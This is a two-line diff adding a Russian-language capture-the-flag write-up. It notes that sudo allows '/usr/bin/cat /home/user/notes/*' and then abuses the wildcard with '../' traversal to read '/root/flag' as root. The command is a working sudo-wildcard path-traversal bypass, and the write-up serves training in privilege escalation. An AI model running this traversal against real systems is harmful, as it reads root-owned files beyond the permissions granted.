@@ -1,0 +1,2 @@
+Подключаемся к машине и видим что можем использовать sudo /usr/bin/cat /home/user/notes/*
+ перейдем в другую директорию с помощью ../ и прочитаем флаг sudo /usr/bin/cat /home/user/notes/../../../root/flag
